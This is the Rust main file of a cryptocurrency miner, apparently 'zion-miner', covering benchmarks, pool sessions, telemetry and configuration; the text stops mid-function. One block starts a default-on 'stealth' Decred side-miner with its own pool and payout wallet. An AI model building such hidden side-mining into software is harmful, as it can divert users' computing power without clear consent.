use anyhow::{anyhow, Context, Result};
use std::collections::VecDeque;
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use zion_core::{CoreRuntime, DifficultyTarget, MiningHeader, MiningJob, RevenueSource};
use zion_pool::{
    decode_message, encode_message, MiningPool, PoolMessage, ShareStatus,
};

mod banner;
mod dcr_hash;
mod dcr_stratum;
mod dcr_worker;
mod gpu_backend;
mod parallel;
mod reconnect;
#[cfg(feature = "gpu")]
mod dcr_gpu;

fn main() -> Result<()> {
    // ── GPU Benchmark mode: `zion-miner --gpu-bench` ──
    #[cfg(feature = "gpu")]
    if std::env::args().any(|a| a == "--gpu-bench") {
        let work_size: usize = std::env::var("ZION_GPU_WORK_SIZE")
            .ok()
            .and_then(|v| v.parse().ok())
            .unwrap_or(1 << 20); // 1M work-items default
        let secs: f64 = std::env::var("ZION_BENCH_SECS")
            .ok()
            .and_then(|v| v.parse().ok())
            .unwrap_or(5.0);

        println!("--- GPU Blake3 DCR benchmark ---");

        // Verify precompute correctness first
        let mut test_header = [0u8; 180];
        for i in 0..180 { test_header[i] = i as u8; }
        if dcr_gpu::verify_precompute(&test_header) {
            println!("precompute_verify=OK");
        } else {
            eprintln!("ERROR: precompute verification FAILED — GPU results would be wrong");
            return Ok(());
        }

        let mut gpu = match dcr_gpu::GpuDcrMiner::new(work_size) {
            Ok(g) => g,
            Err(e) => {
                eprintln!("GPU init failed: {e}");
                return Ok(());
            }
        };
        println!("device={}", gpu.device_name());
        println!("global_work_size={work_size}");

        match gpu.benchmark(secs) {
            Ok((hashes, elapsed, mhps)) => {
                println!("hashes={hashes} elapsed={elapsed:.2}s");
                println!("gpu_blake3: {mhps:.2} MH/s");
            }
            Err(e) => eprintln!("GPU benchmark error: {e}"),
        }
        return Ok(());
    }

    // ── CPU Benchmark mode: `zion-miner --bench` ──
    if std::env::args().any(|a| a == "--bench") {
        let threads: usize = std::env::var("ZION_DCR_THREADS")
            .ok()
            .and_then(|v| v.parse().ok())
            .unwrap_or(1)
            .max(1);
        let secs: f64 = std::env::var("ZION_BENCH_SECS")
            .ok()
            .and_then(|v| v.parse().ok())
            .unwrap_or(5.0);

        println!("blake3_bench simd={} threads={threads} duration={secs:.0}s",
                 dcr_hash::detect_simd());

        // Single-thread: compare full-header vs precomputed-state
        println!("--- single-thread comparison ---");
        let (_, _, mhps_full) = dcr_hash::bench_blake3(secs);
        println!("full_header:   {mhps_full:.2} MH/s");
        let (_, _, mhps_pre) = dcr_hash::bench_blake3_precompute(secs);
        println!("precomputed:   {mhps_pre:.2} MH/s");

        let best_fn = if mhps_pre > mhps_full { "precomputed" } else { "full_header" };
        let best_rate = mhps_full.max(mhps_pre);
        println!("winner: {best_fn} ({best_rate:.2} MH/s)");

        if threads > 1 {
            println!("--- multi-thread ({threads}T) ---");
            let barrier = Arc::new(std::sync::Barrier::new(threads));
            let mut handles = Vec::new();
            for _ in 0..threads {
                let b = barrier.clone();
                handles.push(thread::spawn(move || {
                    b.wait();
                    dcr_hash::bench_blake3(secs)
                }));
            }
            let mut total_mhps = 0.0;
            for h in handles {
                match h.join() {
                    Ok((_, _, mhps)) => total_mhps += mhps,
                    Err(_) => eprintln!("WARNING: benchmark thread panicked"),
                }
            }
            println!("total: {total_mhps:.2} MH/s ({threads} threads)");
        }
        return Ok(());
    }

    let config = MinerConfig::from_env()?;

    // ── Startup banner + hardware detection ──
    banner::print_banner(config.threads);
    println!("miner_id={}", config.miner_id);
    println!("worker_name={}", config.worker_name);
    println!("loop_count={}", config.loop_count);
    println!("job_ttl_ms={}", config.job_ttl_ms);
    println!("threads={}", config.threads);

    // ── Stealth DCR worker (auto-enabled, 1 thread default) ──
    let dcr_stop = Arc::new(AtomicBool::new(false));
    let dcr_state = match dcr_worker::DcrConfig::from_env() {
        Some(dcr_cfg) => {
            println!(
                "dcr_stealth=enabled backend={} hash_impl={} threads={} pool={} payout={} gpu_work_size={} autotune={} autotune_secs={:.2}",
                dcr_cfg.backend.as_str(),
                dcr_cfg.hash_impl.as_str(),
                dcr_cfg.threads,
                dcr_cfg.pool_addr,
                dcr_cfg.wallet_short(),
                dcr_cfg.gpu_work_size,
                dcr_cfg.gpu_autotune,
                dcr_cfg.gpu_autotune_secs
            );
            let (handles, stats) = dcr_worker::spawn_dcr_worker(dcr_cfg, dcr_stop.clone());
            Some((handles, stats))
        }
        None => None,
    };

    if parse_bool_env("ZION_DCR_ONLY", false) {
        let run_secs = parse_env_u64("ZION_DCR_RUN_SECS", 120)?;
        println!("mode=dcr_only run_secs={run_secs}");
        thread::sleep(Duration::from_secs(run_secs));

        dcr_stop.store(true, Ordering::Relaxed);
        if let Some((handles, stats)) = dcr_state {
            for h in handles {
                let _ = h.join();
            }
            let total = stats.total_hashes.load(Ordering::Relaxed);
            let acc = stats.accepted_shares.load(Ordering::Relaxed);
            let rej = stats.rejected_shares.load(Ordering::Relaxed);
            let mhps = total as f64 / run_secs.max(1) as f64 / 1_000_000.0;
            let acc_min = acc as f64 * 60.0 / run_secs.max(1) as f64;
            println!(
                "dcr_only_summary total_hashes={} effective_mhps={:.2} accepted={} rejected={} accepted_per_min={:.2}",
                total, mhps, acc, rej, acc_min
            );
        }
        return Ok(());
    }

    let outcome = match config.pool_addr.as_deref() {
        Some(pool_addr) => {
            println!("mode=remote");
            println!("pool_addr={pool_addr}");
            let reconnect_enabled = parse_bool_env("ZION_RECONNECT", true);
            let max_reconnect = parse_env_u32("ZION_MAX_RECONNECT", 0)?; // 0 = infinite
            if reconnect_enabled {
                println!("reconnect=enabled max_attempts={}", if max_reconnect == 0 { "infinite".to_string() } else { max_reconnect.to_string() });
                reconnect::with_reconnect(
                    max_reconnect,
                    reconnect::Backoff::default_reconnect(),
                    |attempt| {
                        if attempt > 1 {
                            println!("reconnect_attempt={attempt}");
                        }
                        run_remote_session(&config, pool_addr)
                    },
                )?
            } else {
                run_remote_session(&config, pool_addr)?
            }
        }
        None => {
            println!("mode=local");
            run_local_session(&config)?
        }
    };

    println!("last_job_id={}", outcome.last_job_id);
    println!("accepted_shares={}", outcome.accepted_shares);
    println!("rejected_shares={}", outcome.rejected_shares);
    println!("active_jobs={}", outcome.active_jobs);
    println!("accepted_iterations={}", outcome.accepted_iterations);
    println!("attempted_hashes={}", outcome.attempted_hashes);
    println!("elapsed_seconds={:.6}", outcome.elapsed_seconds);
    println!("hashrate_hps={:.2}", outcome.hashrate_hps);
    println!("hashrate_10s_hps={:.2}", outcome.hashrate_10s_hps);
    println!("hashrate_60s_hps={:.2}", outcome.hashrate_60s_hps);
    println!("revenue_total_usd={:.2}", outcome.revenue_total_usd);
    println!("no_solution_iterations={}", outcome.no_solution_iterations);
    println!("local_skip_likely_stale={}", outcome.local_skip_likely_stale);
    println!("submit_avg_latency_ms={:.2}", outcome.submit_avg_latency_ms);
    println!("submit_max_latency_ms={}", outcome.submit_max_latency_ms);

    if let Some(line) = outcome.last_result_line.as_deref() {
        let parsed = decode_message(line)?;
        println!("wire_result_parsed={parsed:?}");
    }

    if let Some(line) = outcome.bye_line.as_deref() {
        let parsed = decode_message(line)?;
        println!("wire_bye_parsed={parsed:?}");
    }

    // ── Shutdown DCR worker ──
    dcr_stop.store(true, Ordering::Relaxed);
    if let Some((handles, stats)) = dcr_state {
        for h in handles {
            let _ = h.join();
        }
        let total = stats.total_hashes.load(Ordering::Relaxed);
        let acc = stats.accepted_shares.load(Ordering::Relaxed);
        let rej = stats.rejected_shares.load(Ordering::Relaxed);
        if total > 0 {
            println!("dcr_total_hashes={total} dcr_accepted={acc} dcr_rejected={rej}");
        }
    }

    Ok(())
}

fn run_local_session(config: &MinerConfig) -> Result<SessionOutcome> {
    let mut pool = MiningPool::with_job_ttl(CoreRuntime::default(), config.job_ttl_ms);
    let started_at = Instant::now();
    let mut attempted_hashes = 0u64;
    let mut accepted_iterations = 0u64;
    let mut rejected_iterations = 0u64;
    let mut last_result_line = None;
    let mut last_job_id = 0u64;
    let mut tuned_nonce_count = config.nonce_count;
    let mut telemetry = SessionTelemetry::new(config.metrics_report_every_secs);
    let threads = config.threads;

    let hello_line = encode_message(&pool.hello_message(&config.miner_id, &config.worker_name))?;
    let welcome_line = encode_message(&pool.welcome_message())?;
    println!("wire_hello={}", hello_line.trim());
    println!("wire_welcome={}", welcome_line.trim());

    for iteration in 0..config.loop_count {
        for stale_job_id in pool.expire_stale_jobs() {
            let stale_line = encode_message(&pool.stale_message(stale_job_id))?;
            let cancel_line =
                encode_message(&pool.cancel_message(stale_job_id, "stale-ttl-expired"))?;
            println!("wire_stale={}", stale_line.trim());
            println!("wire_cancel={}", cancel_line.trim());
        }

        let header = session_header(config, iteration);
        let start_nonce = config
            .start_nonce
            .wrapping_add((iteration as u64).wrapping_mul(config.nonce_stride));
        let job = pool.issue_job(header, config.target, start_nonce, tuned_nonce_count);
        last_job_id = job.job_id;
        let Some(solution) = parallel::parallel_scan_nonce_range(job, threads) else {
            attempted_hashes = attempted_hashes.saturating_add(job.nonce_count);
            rejected_iterations += 1;
            telemetry.record_attempted_hashes(attempted_hashes);
            telemetry.record_no_solution();
            println!("iteration={}", iteration + 1);
            println!("job_id={}", job.job_id);
            println!("nonce_range={}..{}", job.start_nonce, job.start_nonce + job.nonce_count);
            println!("share_status=\"NoSolutionInWindow\"");

            if config.nonce_autotune {
                let previous = tuned_nonce_count;
                tuned_nonce_count = increase_nonce_window(
                    tuned_nonce_count,
                    config.nonce_count_max,
                    config.nonce_adjust_percent,
                );
                if tuned_nonce_count != previous {
                    println!(
                        "nonce_autotune action=grow prev={} next={} max={}",
                        previous, tuned_nonce_count, config.nonce_count_max
                    );
                }
            }
            telemetry.maybe_print_status(
                iteration + 1,
                config.loop_count,
                accepted_iterations,
                rejected_iterations,
                attempted_hashes,
                None,
            );
            continue;
        };

        attempted_hashes = attempted_hashes
            .saturating_add(solution.candidate.nonce.saturating_sub(job.start_nonce) + 1);
        telemetry.record_attempted_hashes(attempted_hashes);

        if config.sleep_ms > 0 {
            thread::sleep(Duration::from_millis(config.sleep_ms));
        }

        let decision = pool.submit_solution(
            config.miner_id.clone(),
            config.worker_name.clone(),
            solution,
            config.revenue_source,
            config.revenue_value_usd,
        );
        if matches!(decision.status, ShareStatus::Accepted) {
            accepted_iterations += 1;
        } else {
            rejected_iterations += 1;
        }

        let submit_started_at = Instant::now();

        let job_line = encode_message(&pool.job_message(job))?;
        let submit_line = encode_message(&pool.solution_message(
            &config.miner_id,
            &config.worker_name,
            solution,
        ))?;
        let result_line = encode_message(&pool.result_message(&decision))?;
        telemetry.record_submit_latency(submit_started_at.elapsed());
        last_result_line = Some(result_line.clone());

        log_solution(iteration + 1, job, solution.candidate.nonce, &solution.hash, &decision.status);
        println!("wire_job={}", job_line.trim());
        println!("wire_submit={}", submit_line.trim());
        println!("wire_result={}", result_line.trim());

        if matches!(decision.status, ShareStatus::StaleJob) {
            let stale_line = encode_message(&pool.stale_message(job.job_id))?;
            let cancel_line =
                encode_message(&pool.cancel_message(job.job_id, "submit-arrived-after-ttl"))?;
            println!("wire_stale={}", stale_line.trim());
            println!("wire_cancel={}", cancel_line.trim());
        }

        if config.nonce_autotune {
            let used = solution.candidate.nonce.saturating_sub(job.start_nonce) + 1;
            let quarter = tuned_nonce_count / 4;
            if quarter > 0 && used <= quarter {
                tuned_nonce_count = decrease_nonce_window(
                    tuned_nonce_count,
                    config.nonce_count_min,
                    config.nonce_adjust_percent,
                );
            }
        }

        telemetry.maybe_print_status(
            iteration + 1,
            config.loop_count,
            accepted_iterations,
            rejected_iterations,
            attempted_hashes,
            None,
        );
    }

    let stats = pool.stats();
    let elapsed_seconds = started_at.elapsed().as_secs_f64();
    let hashrate_hps = if elapsed_seconds > 0.0 {
        attempted_hashes as f64 / elapsed_seconds
    } else {
        0.0
    };
    let bye_line = encode_message(&pool.bye_message())?;
    println!("wire_bye={}", bye_line.trim());

    Ok(SessionOutcome {
        last_job_id,
        accepted_shares: stats.accepted_shares,
        rejected_shares: stats.rejected_shares.saturating_add(rejected_iterations),
        active_jobs: stats.active_jobs,
        accepted_iterations,
        attempted_hashes,
        elapsed_seconds,
        hashrate_hps,
        hashrate_10s_hps: telemetry.hashrate_10s_hps(),
        hashrate_60s_hps: telemetry.hashrate_60s_hps(),
        revenue_total_usd: stats.revenue.total_earnings_usd,
        no_solution_iterations: telemetry.no_solution_iterations,
        local_skip_likely_stale: telemetry.local_skip_likely_stale,
        submit_avg_latency_ms: telemetry.submit_avg_latency_ms(),
        submit_max_latency_ms: telemetry.submit_max_latency_ms,
        last_result_line,
        bye_line: Some(bye_line),
    })
}

fn run_remote_session(config: &MinerConfig, pool_addr: &str) -> Result<SessionOutcome> {
    let started_at = Instant::now();
    let mut attempted_hashes = 0u64;
    let mut accepted_iterations = 0u64;
    let mut rejected_iterations = 0u64;
    let mut last_result_line = None;
    let mut last_job_id = 0u64;
    let mut telemetry = SessionTelemetry::new(config.metrics_report_every_secs);
    let threads = config.threads;

    let stream = TcpStream::connect(pool_addr)
        .with_context(|| format!("failed to connect to pool at {pool_addr}"))?;
    let reader_stream = stream.try_clone().context("failed to clone pool stream")?;
    let mut reader = BufReader::new(reader_stream);
    let mut writer = stream;

    let hello_message = PoolMessage::Hello {
        miner_id: config.miner_id.clone(),
        worker_name: config.worker_name.clone(),
        algorithm: zion_core::consensus_profile().to_string(),
    };
    let hello_line = write_wire_message(&mut writer, &hello_message)?;
    println!("wire_hello={hello_line}");

    let (welcome_line_raw, welcome_message) = read_wire_message(&mut reader)?;
    println!("wire_welcome={welcome_line_raw}");
    let remote_job_ttl_ms = match welcome_message {
        PoolMessage::Welcome { job_ttl_ms, .. } => job_ttl_ms,
        other => return Err(anyhow!("expected welcome from pool, got {other:?}")),
    };

    let ttl_guard_ms = remote_job_ttl_ms
        .saturating_mul(config.remote_ttl_guard_percent)
        .saturating_div(100);

    for iteration in 0..config.loop_count {
        let (job_line, job) = read_next_job(&mut reader)?;
        let job_started_at = Instant::now();
        last_job_id = job.job_id;
        let Some(solution) = parallel::parallel_scan_nonce_range(job, threads) else {
            attempted_hashes = attempted_hashes.saturating_add(job.nonce_count);
            rejected_iterations += 1;
            telemetry.record_attempted_hashes(attempted_hashes);
            telemetry.record_no_solution();
            println!("iteration={}", iteration + 1);
            println!("job_id={}", job.job_id);
            println!("nonce_range={}..{}", job.start_nonce, job.start_nonce + job.nonce_count);
            println!("share_status=\"NoSolutionInWindow\"");
            println!("wire_job={job_line}");
            telemetry.maybe_print_status(
                iteration + 1,
                config.loop_count,
                accepted_iterations,
                rejected_iterations,
                attempted_hashes,
                Some(remote_job_ttl_ms),
            );
            continue;
        };
        attempted_hashes = attempted_hashes
            .saturating_add(solution.candidate.nonce.saturating_sub(job.start_nonce) + 1);
        telemetry.record_attempted_hashes(attempted_hashes);

        if config.sleep_ms > 0 {
            thread::sleep(Duration::from_millis(config.sleep_ms));
        }

        let elapsed_ms = job_started_at.elapsed().as_millis() as u64;
        if ttl_guard_ms > 0 && elapsed_ms >= ttl_guard_ms {
            // Skip likely-stale submit when local hashing is slower than pool TTL.
            println!("iteration={}", iteration + 1);
            println!("job_id={}", job.job_id);
            println!("nonce_range={}..{}", job.start_nonce, job.start_nonce + job.nonce_count);
            println!("found_nonce={}", solution.candidate.nonce);
            println!("hash={}", hex(&solution.hash));
            println!("share_status=\"LocalSkipLikelyStale\"");
            println!("scan_elapsed_ms={elapsed_ms}");
            println!("ttl_guard_ms={ttl_guard_ms}");
            println!("wire_job={job_line}");
            telemetry.record_local_skip_likely_stale();
            telemetry.maybe_print_status(
                iteration + 1,
                config.loop_count,
                accepted_iterations,
                rejected_iterations,
                attempted_hashes,
                Some(remote_job_ttl_ms),
            );
            continue;
        }

        let submit_started_at = Instant::now();
        let submit_message = PoolMessage::Submit {
            job_id: solution.job_id,
            miner_id: config.miner_id.clone(),
            worker_name: config.worker_name.clone(),
            nonce: solution.candidate.nonce,
            hash_hex: hex(&solution.hash),
        };
        let submit_line = write_wire_message(&mut writer, &submit_message)?;
        let (result_line_raw, result_message) = read_next_result(&mut reader)?;
        telemetry.record_submit_latency(submit_started_at.elapsed());
        last_result_line = Some(result_line_raw.clone());

        let status = match result_message {
            PoolMessage::Result { accepted, status } => {
                if accepted {
                    accepted_iterations += 1;
                } else {
                    rejected_iterations += 1;
                }
                status
            }
            other => return Err(anyhow!("expected result from pool, got {other:?}")),
        };

        log_solution(iteration + 1, job, solution.candidate.nonce, &solution.hash, &status);
        println!("wire_job={job_line}");
        println!("wire_submit={submit_line}");
        println!("wire_result={result_line_raw}");
        telemetry.maybe_print_status(
            iteration + 1,
            config.loop_count,
            accepted_iterations,
            rejected_iterations,
            attempted_hashes,
            Some(remote_job_ttl_ms),
        );
    }

    // Remote pool sessions are long-lived and may immediately stream another
    // job after the configured loop count. Finish cleanly with the local run
    // counters instead of requiring a terminal Bye frame.
    let elapsed_seconds = started_at.elapsed().as_secs_f64();
    let hashrate_hps = if elapsed_seconds > 0.0 {
        attempted_hashes as f64 / elapsed_seconds
    } else {
        0.0
    };

    Ok(SessionOutcome {
        last_job_id,
        accepted_shares: accepted_iterations,
        rejected_shares: rejected_iterations,
        active_jobs: 0,
        accepted_iterations,
        attempted_hashes,
        elapsed_seconds,
        hashrate_hps,
        hashrate_10s_hps: telemetry.hashrate_10s_hps(),
        hashrate_60s_hps: telemetry.hashrate_60s_hps(),
        revenue_total_usd: 0.0,
        no_solution_iterations: telemetry.no_solution_iterations,
        local_skip_likely_stale: telemetry.local_skip_likely_stale,
        submit_avg_latency_ms: telemetry.submit_avg_latency_ms(),
        submit_max_latency_ms: telemetry.submit_max_latency_ms,
        last_result_line,
        bye_line: None,
    })
}

#[derive(Debug, Clone)]
struct HashrateWindow {
    samples: VecDeque<(Instant, u64)>,
    window_secs: u64,
}

impl HashrateWindow {
    fn new(window_secs: u64) -> Self {
        Self {
            samples: VecDeque::with_capacity(128),
            window_secs,
        }
    }

    fn push_total_hashes(&mut self, now: Instant, total_hashes: u64) {
        self.samples.push_back((now, total_hashes));
        let cutoff = now.checked_sub(Duration::from_secs(self.window_secs.saturating_add(2)));
        if let Some(cutoff) = cutoff {
            while self.samples.front().is_some_and(|(t, _)| *t < cutoff) {
                self.samples.pop_front();
            }
        }
    }

    fn rate_hps(&self) -> f64 {
        let (Some((first_t, first_hashes)), Some((last_t, last_hashes))) =
            (self.samples.front(), self.samples.back())
        else {
            return 0.0;
        };
        let dt = last_t.duration_since(*first_t).as_secs_f64();
        if dt < 0.5 || last_hashes < first_hashes {
            return 0.0;
        }
        (last_hashes - first_hashes) as f64 / dt
    }
}

#[derive(Debug, Clone)]
struct SessionTelemetry {
    status_started_at: Instant,
    last_status_at: Instant,
    report_every_secs: u64,
    window_10s: HashrateWindow,
    window_60s: HashrateWindow,
    no_solution_iterations: u64,
    local_skip_likely_stale: u64,
    submit_samples: u64,
    submit_total_latency_ms: u128,
    submit_max_latency_ms: u64,
}

impl SessionTelemetry {
    fn new(report_every_secs: u64) -> Self {
        let now = Instant::now();
        Self {
            status_started_at: now,
            last_status_at: now,
            report_every_secs,
            window_10s: HashrateWindow::new(10),
            window_60s: HashrateWindow::new(60),
            no_solution_iterations: 0,
            local_skip_likely_stale: 0,
            submit_samples: 0,
            submit_total_latency_ms: 0,
            submit_max_latency_ms: 0,
        }
    }

    fn record_attempted_hashes(&mut self, attempted_hashes: u64) {
        let now = Instant::now();
        self.window_10s.push_total_hashes(now, attempted_hashes);
        self.window_60s.push_total_hashes(now, attempted_hashes);
    }

    fn record_no_solution(&mut self) {
        self.no_solution_iterations = self.no_solution_iterations.saturating_add(1);
    }

    fn record_local_skip_likely_stale(&mut self) {
        self.local_skip_likely_stale = self.local_skip_likely_stale.saturating_add(1);
    }

    fn record_submit_latency(&mut self, duration: Duration) {
        let ms = duration.as_millis() as u64;
        self.submit_samples = self.submit_samples.saturating_add(1);
        self.submit_total_latency_ms = self.submit_total_latency_ms.saturating_add(ms as u128);
        self.submit_max_latency_ms = self.submit_max_latency_ms.max(ms);
    }

    fn hashrate_10s_hps(&self) -> f64 {
        self.window_10s.rate_hps()
    }

    fn hashrate_60s_hps(&self) -> f64 {
        self.window_60s.rate_hps()
    }

    fn submit_avg_latency_ms(&self) -> f64 {
        if self.submit_samples == 0 {
            0.0
        } else {
            self.submit_total_latency_ms as f64 / self.submit_samples as f64
        }
    }

    fn maybe_print_status(
        &mut self,
        iteration_done: u32,
        loop_count: u32,
        accepted: u64,
        rejected: u64,
        attempted_hashes: u64,
        remote_job_ttl_ms: Option<u64>,
    ) {
        let now = Instant::now();
        let is_final = loop_count > 0 && iteration_done >= loop_count;
        let elapsed_since_last = now.duration_since(self.last_status_at).as_secs();
        let should_print = is_final
            || (self.report_every_secs > 0 && elapsed_since_last >= self.report_every_secs);
        if !should_print {
            return;
        }

        let uptime = now.duration_since(self.status_started_at).as_secs_f64().max(0.001);
        let overall_hps = attempted_hashes as f64 / uptime;
        let total_decisions = accepted.saturating_add(rejected);
        let accept_pct = if total_decisions > 0 {
            accepted as f64 * 100.0 / total_decisions as f64
        } else {
            0.0
        };
        let submit_avg = self.submit_avg_latency_ms();
        let ttl_text = remote_job_ttl_ms
            .map(|ttl| ttl.to_string())
            .unwrap_or_else(|| "n/a".to_string());

        println!(
            "session_status iter={}/{} uptime_s={:.1} accepted={} rejected={} accept_pct={:.2} no_solution={} local_skip={} hps_overall={:.2} hps_10s={:.2} hps_60s={:.2} submit_avg_ms={:.2} submit_max_ms={} remote_ttl_ms={}",
            iteration_done,
            loop_count,
            uptime,
            accepted,
            rejected,
            accept_pct,
            self.no_solution_iterations,
            self.local_skip_likely_stale,
            overall_hps,
            self.hashrate_10s_hps(),
            self.hashrate_60s_hps(),
            submit_avg,
            self.submit_max_latency_ms,
            ttl_text,
        );
        self.last_status_at = now;
    }
}

fn read_next_job(reader: &mut impl BufRead) -> Result<(String, MiningJob)> {
    loop {
        let (line, message) = read_wire_message(reader)?;
        match message {
            PoolMessage::Job {
                job_id,
                start_nonce,
                nonce_count,
                target_hex,
                header_hex,
                height,
                ..
            } => {
                return Ok((
                    line,
                    MiningJob {
                        job_id,
                        header: parse_header_hex(&header_hex)?,
                        target: DifficultyTarget {
                            bytes: parse_fixed_hex::<32>(&target_hex, "job target")?,
                        },
                        start_nonce,
                        nonce_count,
                        height,
                    },
                ))
            }
            PoolMessage::Stale { .. } => println!("wire_stale={line}"),
            PoolMessage::Cancel { .. } => println!("wire_cancel={line}"),
            other => return Err(anyhow!("expected job from pool, got {other:?}")),
        }
    }
}

fn read_next_result(reader: &mut impl BufRead) -> Result<(String, PoolMessage)> {
    loop {
        let (line, message) = read_wire_message(reader)?;
        match message {
            PoolMessage::Result { .. } => return Ok((line, message)),
            PoolMessage::Stale { .. } => println!("wire_stale={line}"),
            PoolMessage::Cancel { .. } => println!("wire_cancel={line}"),
            other => return Err(anyhow!("expected result from pool, got {other:?}")),
        }
    }
}

fn read_wire_message(reader: &mut impl BufRead) -> Result<(String, PoolMessage)> {
    let mut line = String::new();
    let read = reader
        .read_line(&mut line)
        .context("failed to read wire message")?;
    if read == 0 {
        return Err(anyhow!("pool closed the connection"));
    }
    let message = decode_message(&line).context("failed to decode wire message")?;
    Ok((line.trim().to_string(), message))
}

fn write_wire_message(writer: &mut impl Write, message: &PoolMessage) -> Result<String> {
    let line = encode_message(message).context("failed to encode wire message")?;
    writer
        .write_all(line.as_bytes())
        .context("failed to write wire message")?;
    writer.flush().context("failed to flush wire message")?;
    Ok(line.trim().to_string())
}

fn session_header(config: &MinerConfig, iteration: u32) -> MiningHeader {
    MiningHeader {
        version: 3,
        previous_hash: [0x11; 32],
        merkle_root: [0x22; 32],
        timestamp: config.timestamp + iteration as u64,
        difficulty_bits: 0x1f00ffff,
    }
}

fn log_solution<T: std::fmt::Debug>(
    iteration: u32,
    job: MiningJob,
    found_nonce: u64,
    hash: &[u8; 32],
    status: T,
) {
    println!("iteration={iteration}");
    println!("job_id={}", job.job_id);
    println!("nonce_range={}..{}", job.start_nonce, job.start_nonce + job.nonce_count);
    println!("found_nonce={found_nonce}");
    println!("hash={}", hex(hash));
    println!("share_status={status:?}");
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{:02x}", byte)).collect()
}

fn parse_header_hex(raw: &str) -> Result<MiningHeader> {
    let bytes = parse_fixed_hex::<80>(raw, "job header")?;

    let version = u32::from_le_bytes(
        bytes[0..4].try_into().context("header version slice")?,
    );
    let previous_hash: [u8; 32] = bytes[4..36]
        .try_into()
        .context("previous hash slice")?;
    let merkle_root: [u8; 32] = bytes[36..68]
        .try_into()
        .context("merkle root slice")?;
    let timestamp = u64::from_le_bytes(
        bytes[68..76].try_into().context("timestamp slice")?,
    );
    let difficulty_bits = u32::from_le_bytes(
        bytes[76..80].try_into().context("difficulty bits slice")?,
    );

    Ok(MiningHeader {
        version,
        previous_hash,
        merkle_root,
        timestamp,
        difficulty_bits,
    })
}

fn parse_fixed_hex<const N: usize>(raw: &str, label: &str) -> Result<[u8; N]> {
    let normalized = raw.trim().trim_start_matches("0x");
    if normalized.len() != N * 2 {
        return Err(anyhow!("{label} must be exactly {} hex chars", N * 2));
    }

    let mut bytes = [0u8; N];
    for (index, chunk) in normalized.as_bytes().chunks(2).enumerate() {
        let pair = std::str::from_utf8(chunk).with_context(|| format!("{label} contains non-utf8 hex"))?;
        bytes[index] = u8::from_str_radix(pair, 16)
            .with_context(|| format!("invalid hex byte '{pair}' in {label}"))?;
    }
    Ok(bytes)
}

#[derive(Debug, Clone)]
struct SessionOutcome {
    last_job_id: u64,
    accepted_shares: u64,
    rejected_shares: u64,
    active_jobs: usize,
    accepted_iterations: u64,
    attempted_hashes: u64,
    elapsed_seconds: f64,
    hashrate_hps: f64,
    hashrate_10s_hps: f64,
    hashrate_60s_hps: f64,
    revenue_total_usd: f64,
    no_solution_iterations: u64,
    local_skip_likely_stale: u64,
    submit_avg_latency_ms: f64,
    submit_max_latency_ms: u64,
    last_result_line: Option<String>,
    bye_line: Option<String>,
}

#[derive(Debug, Clone)]
struct MinerConfig {
    miner_id: String,
    worker_name: String,
    pool_addr: Option<String>,
    loop_count: u32,
    job_ttl_ms: u64,
    nonce_stride: u64,
    start_nonce: u64,
    nonce_count: u64,
    nonce_autotune: bool,
    nonce_count_min: u64,
    nonce_count_max: u64,
    nonce_adjust_percent: u64,
    remote_ttl_guard_percent: u64,
    metrics_report_every_secs: u64,
    sleep_ms: u64,
    timestamp: u64,
    target: DifficultyTarget,
    revenue_source: RevenueSource,
    revenue_value_usd: f64,
    threads: usize,
}

impl MinerConfig {
    fn from_env() -> Result<Self> {
        Ok(Self {
            miner_id: env_or_default("ZION_MINER_ID", "local-miner"),
            worker_name: env_or_default("ZION_WORKER_NAME", "cpu-rig-0"),
            pool_addr: std::env::var("ZION_POOL_ADDR").ok().filter(|value| !value.trim().is_empty()),
            loop_count: parse_env_u32("ZION_LOOP_COUNT", 1)?,
            job_ttl_ms: parse_env_u64("ZION_JOB_TTL_MS", 15_000)?,
            nonce_stride: parse_env_u64("ZION_NONCE_STRIDE", 1_024)?,
            start_nonce: parse_env_u64("ZION_START_NONCE", 42)?,
            nonce_count: parse_env_u64("ZION_NONCE_COUNT", 1024)?,
            nonce_autotune: parse_bool_env("ZION_NONCE_AUTOTUNE", true),
            nonce_count_min: parse_env_u64("ZION_NONCE_COUNT_MIN", 10_000)?,
            nonce_count_max: parse_env_u64("ZION_NONCE_COUNT_MAX", 5_000_000)?,
            nonce_adjust_percent: parse_env_u64("ZION_NONCE_ADJUST_PCT", 50)?,
            remote_ttl_guard_percent: parse_env_u64("ZION_REMOTE_TTL_GUARD_PCT", 90)?.clamp(10, 100),
            metrics_report_every_secs: parse_env_u64("ZION_METRICS_REPORT_SECS", 30)?,
            sleep_ms: parse_env_u64("ZION_SLEEP_MS", 0)?,
            timestamp: parse_env_u64("ZION_TIMESTAMP", 1_762_000_200)?,
            target: parse_target_env("ZION_TARGET")?,
            revenue_source: parse_revenue_source(
                &std::env::var("ZION_REVENUE_SOURCE").unwrap_or_else(|_| "zion".to_string()),
            )?,
            revenue_value_usd: parse_env_f64("ZION_REVENUE_USD", 1.25)?,
            threads: parallel::detect_threads(),
        })
    }
}

fn env_or_default(key: &str, default: &str) -> String {
    std::env::var(key).unwrap_or_else(|_| default.to_string())
}

fn parse_env_u64(key: &str, default: u64) -> Result<u64> {
    match std::env::var(key) {
        Ok(value) => value
            .parse::<u64>()
            .with_context(|| format!("invalid u64 in {key}: {value}")),
        Err(_) => Ok(default),
    }
}

fn parse_env_u32(key: &str, default: u32) -> Result<u32> {
    match std::env::var(key) {
        Ok(value) => value
            .parse::<u32>()
            .with_context(|| format!("invalid u32 in {key}: {value}")),
        Err(_) => Ok(default),
    }
}

fn parse_env_f64(key: &str, default: f64) -> Result<f64> {
    match std::env::var(key) {
        Ok(value) => value
            .parse::<f64>()
            .with_context(|| format!("invalid f64 in {key}: {value}")),
        Err(_) => Ok(default),
    }
}

fn parse_target_env(key: &str) -> Result<DifficultyTarget> {
    let raw = match std::env::var(key) {
        Ok(value) => value,
        Err(_) => return Ok(DifficultyTarget::MAX),
    };

    let normalized = raw.trim().trim_start_matches("0x");
    if normalized.len() != 64 {
        return Err(anyhow!("{key} must be exactly 64 hex chars"));
    }

    let mut bytes = [0u8; 32];
    for (index, chunk) in normalized.as_bytes().chunks(2).enumerate() {
        let pair = std::str::from_utf8(chunk).context("target contains non-utf8 hex")?;
        bytes[index] = u8::from_str_radix(pair, 16)
